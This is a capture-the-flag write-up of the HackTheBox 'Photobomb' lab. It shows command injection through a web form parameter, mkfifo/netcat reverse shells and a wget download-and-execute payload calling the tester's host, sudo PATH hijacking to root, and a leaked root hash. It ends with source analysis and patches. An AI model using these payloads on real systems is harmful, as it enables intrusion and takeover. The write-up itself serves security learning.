---
title: HackTheBox - Photobomb
author: yufong
categories: [HackTheBox, HackTheBox - Linux]
date: 2022-10-16
tags: [exploit/command-injection, path-hijacking]
img_path: /_posts/Writeups/HackTheBox/Linux/Photobomb/images/
image:
  path: /_posts/Writeups/HackTheBox/Linux/Photobomb/images/Pasted%20image%2020221015154250.png
  width: 1000   # in pixels
  height: 400   # in pixels
---


# Overview 
This machine begins w/ web enumeration, viewing the page source of the index page reveals a javascript file `photobomb.js` containing credentials for `/printer`. `/printer` directory is a tool that allow users to download the images that are displayed, however it is susceptible to a command injection vulnerability, specifically the `filetype` POST parameter, due to the lack of input sanitization, allowing us to invoke a reverse shell, obtaining a low-privilege/`wizard` user.

After enumerating the system, user `wizard` has a sudoers entry that allows user `wizard` to execute `/opt/cleanup.sh` as root and `SETENV` set the path environment. After analyzing `cleanup.sh` script, it is susceptible to a PATH Hijacking exploit due to calling `find` & `chown` w/o its FULL PATH, by creating a malicious script also called `find` or `chown` at a writable directory (`/tmp`), we are able to execute `/opt/cleanup.sh` and prepend `/tmp` to the PATH environment, causing our malicious script to execute first, instead of the actual binary, allowing us to privilege escalate to `root`.



---

| Column       | Details      |
| ------------ | ------------ |
| Box Name     | Photobomb    |
| IP           | 10.10.11.182 |
| Points       | 20           |
| Difficulty   | Easy         |
| Creator      |  [slartibartfast](https://www.hackthebox.com/home/users/profile/85231)            |
| Release Date | 	08 Oct 2022             |


# Recon

## TCP/80 (HTTP)
- FFUF
	> Nothing interesting enumerated
	{: .prompt-info}

# Initial Foothold

## TCP/80 (HTTP) - /printer (Basic Authentication), Creds Found
1. Found a password protected directory, `/printer`
	![]({{ page.img_path }}Pasted%20image%2020221015154826.png)
	> Basic Authentication
	{: .prompt-info}

2. Credentials for the encrypted directory can be in a `.js` file that the page is referencing 
	![]({{ page.img_path }}Pasted%20image%2020221015155326.png)
	```
	┌──(root💀kali)-[~/htb/photobomb/10.10.11.182/exploit]
	└─# curl http://photobomb.htb/photobomb.js
	function init() {
	  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
	  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
		document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
	  }
	}
	window.onload = init;
	```
	>- `pH0t0:b0Mb!`
	{: .prompt-info}

3. Successfully login w/ `pH0t0:b0Mb!` 
	![]({{ page.img_path }}Pasted%20image%2020221015155819.png)
	> `/printer` allows authenticated users to select an image, change its dimensions, file extension (`.jpg, .png`) and download it.
	{: .prompt-info}


## TCP/80 (HTTP) - /printer, Command Injection
1. Download an image, intercept the request w/ `burp`
	![]({{ page.img_path }}Pasted%20image%2020221015160228.png)
	- Parameters: `photo`, `filetype`, `dimensions`
2. Determine if the parameters are susceptible to SQLi
	```
	┌──(root💀kali)-[~/htb/photobomb/10.10.11.182/exploit]
	└─# sqlmap -r printer.req --batch
	
	[13:54:59] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more t
	ests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2com
	ment') and/or switch '--random-agent'
	[13:54:59] [WARNING] HTTP error codes detected during run:
	500 (Internal Server Error) - 219 times
	
	[*] ending @ 13:54:59 /2022-10-15/
	```
	- Failed
3. After some testing, I can conclude that
	- This is a valid request
		![]({{ page.img_path }}Pasted%20image%2020221015162531.png)
	- `photo` - specify photo name, must match the photo that exists on the webserver, 
		![]({{ page.img_path }}Pasted%20image%2020221015161904.png)
		> any invalid name will cause a `500 Internal Server Error - Source photo does not exist`
		{: .prompt-info}
	- `filetype` - specify file type (`jpg`, `png`) only, 
		![]({{ page.img_path }}Pasted%20image%2020221015162415.png)
		> - however we are able to append anything  as long as `jpg` or `png` is infront of the appended text.
		> - We can see that the request is processed `filename=andrea-de-santis-uCFuP0Gc_MM-unsplash_1x1.jpg testing 123`
		{: .prompt-info}
	- `dimensions` - specify dimension `numberxnumber`
4. Determine if `filetype` `POST` parameter is susceptible to command injection
	```
	# Payload
	photo=andrea-de-santis-uCFuP0Gc_MM-unsplash.jpg&filetype=jpg; echo "Vulnerable to Command Injection!" | nc 10.10.14.39 4444&dimensions=1x1
	```
	![]({{ page.img_path }}Pasted%20image%2020221015163028.png)
	```
	┌──(root💀kali)-[~/htb/photobomb]
	└─# nc -nvlp 4444
	Ncat: Version 7.92 ( https://nmap.org/ncat )
	Ncat: Listening on :::4444
	Ncat: Listening on 0.0.0.0:4444
	Ncat: Connection from 10.10.11.182.
	Ncat: Connection from 10.10.11.182:35828.
	Vulnerable to Command Injection!
	```
	> It is vulnerable !
	{: .prompt-info}

5. Could not Invoke reverse shell, instead we download a reverse shell payload onto `photobomb.htb` and execute it
6. Create reverse shell payload
	```bash
	#!/bin/bash
	rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.39 4444 >/tmp/f
	```
7. Host reverse shell payload
	```
	┌──(root💀kali)-[~/htb/photobomb/10.10.11.182/exploit]
	└─# python3 -m http.server 80
	```
8. Download it onto `photobomb.htb` & execute it!
	```
	# Payload
	jpg;wget -O /tmp/exploit.sh 10.10.14.39/exploit.sh; chmod 777 /tmp/exploit.sh; sh /tmp/exploit.sh
	```
9. Demo - `filetype` Command Injection
	![](wQdRpvmb8B.gif)
10. Demo - Invoke reverse shell
	![](wUaaQzhRG9.gif)






# Privilege Escalation

## Root - Enumeration
1. View `wizard` sudo access
	```
	wizard@photobomb:~$ sudo -l
	Matching Defaults entries for wizard on photobomb:
	    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
	
	User wizard may run the following commands on photobomb:
	    (root) SETENV: NOPASSWD: /opt/cleanup.sh
	```
	> `SETENV` & execute `/opt/cleanup.sh` as root
	{: .prompt-info}

2. View `/opt/cleanup.sh`
	```
	wizard@photobomb:~$ cat /opt/cleanup.sh
	#!/bin/bash
	. /opt/.bashrc
	cd /home/wizard/photobomb
	
	# clean up log files
	if [ -s log/photobomb.log ] && ! [ -L log/photobomb.log ]
	then
	  /bin/cat log/photobomb.log > log/photobomb.log.old
	  /usr/bin/truncate -s0 log/photobomb.log
	fi
	
	# protect the priceless originals
	find source_images -type f -name '*.jpg' -exec chown root:root {} \;
	```
	> `find` & `chown` is not called w/ its FULL PATH, thus it is susceptible to PATH Hijacking
	{: .prompt-info}

3. What is PATH Hijacking
	1. When a command is executed w/o its full path, the system searches through the PATH environment variable for the specified command.
	2. Since we are able to `SETENV`, we can easily prepend a writable PATH (`/tmp`)
	3. Create a malicious binary at `/tmp` named the same as the binary that is not called w/ its FULL PATH
	4. Since `/tmp` is the first PATH in our path environment variable, `/tmp/find` will be invoked first, instead of the actual binary, allowing us to privilege escalate.

## Root - SUDO SETENV PATH Hijacking
1. How do exploit `/opt/cleanup.sh` (PATH Hijacking)
	1. Since `find` is not called w/ its FULL PATH, we are able to do PATH Hijacking.
	2. Create a malicious script/binary called `find` at `/tmp` directory
	3. Execute `/opt/cleanup.sh` and prepend `/tmp` to the PATH environment variable.
	4. When `find` is called, the system will search `/tmp` directory and locates `find` and executes it, instead of the actual find binary, allowing us to privilege escalate to `root`.
 2. Exploiting `/opt/cleanup.sh` (PATH Hijacking)
	1. Create reverse shell script `find`
		```
		wizard@photobomb:/tmp$ nano find
		rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.104 4444 >/tmp/f
		
		wizard@photobomb:/tmp$ nano find
		wizard@photobomb:/tmp$ chmod +x find
		```
	2. Execute `/opt/cleanup.sh` as root and prepend `/tmp` to the PATH environment variable
		```
		wizard@photobomb:/tmp$ sudo PATH=/tmp:$PATH /opt/cleanup.sh
		```
	3. `root` shell obtained
		```
		┌──(root💀kali)-[~/htb/photobomb]
		└─# nc -nvlp 4444
		Ncat: Version 7.92 ( https://nmap.org/ncat )
		Ncat: Listening on :::4444
		Ncat: Listening on 0.0.0.0:4444
		Ncat: Connection from 10.10.11.182.
		Ncat: Connection from 10.10.11.182:35754.
		# id;whoami
		uid=0(root) gid=0(root) groups=0(root)
		croot
		# d /root
		l# s
		root.txt
		# cat root.txt
		84da75742fa76a4a515ed0665a5d1c29
		#
		```
	4. `chown` works as well!
3. Demo - PATH Hijacking privilege escalation
	![](XWWK8oMGto.gif)
4. `root` hash 
	```
	$6$7MU2U.CeiY0WX91P$TUNn8zNu/XUPSgURRJbzYvnnawpZdGhsWiLSpVrm1cIx9Rev7V/yQ5x58gTy98zcXrv6RqlWRtXcbhEhTl3240
	```


# Additional

## How did the Command Injection exploit work?
1. View `server.rb`
	```
	...SNIP...
	post '/printer' do
	  photo = params[:photo]
	  filetype = params[:filetype]
	  dimensions = params[:dimensions]
	
	  if !filetype.match(/^(png|jpg)/)
	    halt 500, 'Invalid filetype.'
	  end
	
	  filename = photo.sub('.jpg', '') + '_' + dimensions + '.' + filetype
	  response['Content-Disposition'] = "attachment; filename=#{filename}"
	
	  if !File.exists?('resized_images/' + filename)
	    command = 'convert source_images/' + photo + ' -resize ' + dimensions + ' resized_images/' + filename
	    puts "Executing: #{command}"
	    system(command)
	  else
	    puts "File already exists."
	  end
	...SNIP...
	```
	>1. `/printer` accepts 3 `POST` parameters, `photo`, `filetype`, `dimensions`
	>2. `filetype` `POST` parameter is susceptible to a command injection attack due to the lack of input sanitization, the webserver checks whether `filetype` `POST` parameter starts w/ `png` or `jpg`. 
	>3. This means that `png ;<Command Injection)`, `jpg <Command Injection>` is valid.
	>4. Next, the `filetype` parameter is directly passed into `system` where code execution happens, thus we are able to do command injection.
	{: .prompt-info}
	
## Patch Command Injection Vulnerability
1. Add another check for `POST` parameter `filetype`
	```ruby
	  if !filetype.match(/^(png|jpg)/)
		halt 500, 'Invalid filetype.'
	  end
	
	================================== ADDED ==================================
	  if filetype.match('\!|\/|\$|\`|\;')
	    halt 500, 'Command Injection Failed'
	  end
	```
	> This will check whether `filetype` `POST` parameter contains dangerous characters.
	{: .prompt-info}

2. OR add `$`
	```ruby
	  if !filetype.match(/^(png|jpg)$/)
		halt 500, 'Invalid filetype.'
	  end
	```
	> `filetype` `POST` parameter must start w/ **and** end w/ `png` or `jpg`.
	{: .prompt-info}

3. Stop `sinatra` server
	```
	wizard@photobomb:~/photobomb$ kill -9 $(pidof ruby)
	```
4. Start `sinatra` server
	```
	wizard@photobomb:~/photobomb$ ruby server.rb
	```
5. Command Injection Patched !
	```
	HTTP/1.1 500 Internal Server Error
	Server: nginx/1.18.0 (Ubuntu)
	Date: Sun, 23 Oct 2022 09:22:07 GMT
	Content-Type: text/html;charset=utf-8
	Content-Length: 24
	Connection: close
	X-Xss-Protection: 1; mode=block
	X-Content-Type-Options: nosniff
	X-Frame-Options: SAMEORIGIN
	
	Command Injection Failed
	```
	![]({{ page.img_path }}Pasted%20image%2020221023172508.png)
6. Demo - Command Injection Patched
	![](k77xK9YlC4.gif)